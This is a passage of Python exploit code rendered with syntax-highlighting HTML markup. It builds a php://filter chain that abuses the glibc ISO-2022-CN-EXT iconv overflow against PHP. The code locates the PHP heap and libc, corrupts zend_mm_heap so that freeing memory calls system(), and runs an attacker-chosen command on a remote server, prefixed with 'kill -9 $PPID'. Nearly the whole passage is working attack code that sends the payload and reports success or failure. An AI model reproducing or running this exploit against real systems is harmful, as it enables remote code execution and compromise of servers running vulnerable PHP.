        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'HEAP address: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

        <span class="token comment"># Libc</span>

        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>

        <span class="token comment">#self.download_file(libc.path, LIBC_FILE)</span>

        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'LIBC address: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>start<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start

    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Region<span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>
        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> region

    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>
        data <span class="token operator">=</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>data_decode<span class="token punctuation">(</span>self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span><span class="token punctuation">)</span>
        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Region<span class="token punctuation">:</span>
        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>
        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>
        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>
            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>
            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>
            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>
            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">&gt;=</span> HEAP_SIZE
            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>
            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"[anon:zend_alloc]"</span><span class="token punctuation">)</span>
        <span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>
            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>

        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>
            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>
            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">{</span>heaps<span class="token punctuation">}</span></span><span class="token string">[/] (using last one)"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> first

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token comment">#self.check_vulnerable()</span>
        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>

        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>
        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>
        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>
        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>

        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>
        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>
        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>

        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>

        CS <span class="token operator">=</span> <span class="token number">0x100</span>

        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>
        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>
        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size
        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>
        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>
        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>
        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>

        step1_size <span class="token operator">=</span> <span class="token number">1</span>
        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size
        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>
        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>
        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>
        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>

        <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>
        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>

        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>
        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>
        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>
        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>

        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>
        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>
        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>
        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>

        step3_size <span class="token operator">=</span> CS

        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size
        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS
        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>
        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>
        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>
        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>

        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG
        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS
        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>
        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>
        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>
        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>

        step4_size <span class="token operator">=</span> CS
        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>
        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>
        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>
        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>

        <span class="token comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span>
        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>
        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>
            <span class="token number">0x200000</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token comment"># free_slot</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>
        <span class="token punctuation">)</span>

        step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>
            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>
        <span class="token punctuation">)</span>

        step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>

        COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command
        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">{</span>COMMAND<span class="token punctuation">}</span></span><span class="token string">"</span></span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>
            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">}</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">{</span>COMMAND<span class="token punctuation">}</span></span><span class="token string">"</span></span>
        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>

        <span class="token keyword">assert</span> <span class="token punctuation">(</span>
            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size
        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>

        step4_use_custom_heap <span class="token operator">=</span> COMMAND
        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>
        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>
        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>
        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>
        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>

        pages <span class="token operator">=</span> <span class="token punctuation">(</span>
            step4 <span class="token operator">*</span> <span class="token number">3</span>
            <span class="token operator">+</span> step4_pwn
            <span class="token operator">+</span> step4_custom_heap
            <span class="token operator">+</span> step4_use_custom_heap
            <span class="token operator">+</span> step3_overflow
            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad
            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>
            <span class="token operator">+</span> step2_write_ptr
            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>
        <span class="token punctuation">)</span>

        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>
        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span> <span class="token comment">#b64(pages) </span>
        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>

        filters <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token comment"># Create buckets</span>
            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>
            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 0: Setup heap</span>
            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 1: Reverse FL order</span>
            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>
            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 3: Trigger overflow</span>
            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>
            
            <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>
            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>
            <span class="token string">"convert.iconv.L1.L1"</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>
        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">{</span>filters<span class="token punctuation">}</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">{</span>resource<span class="token punctuation">}</span></span><span class="token string">"</span></span>

        <span class="token keyword">return</span> path

    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">try</span><span class="token punctuation">:</span>
            msg_print<span class="token punctuation">(</span><span class="token string">"Sending exploit..."</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'PATH: </span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send_exploit<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        
        msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>
            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>
            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>
        
        msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.
    """</span>
    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>
    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">{</span>data<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>
    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.
    """</span>
    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>
    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size
    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>
    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>

    <span class="token keyword">return</span> bucket


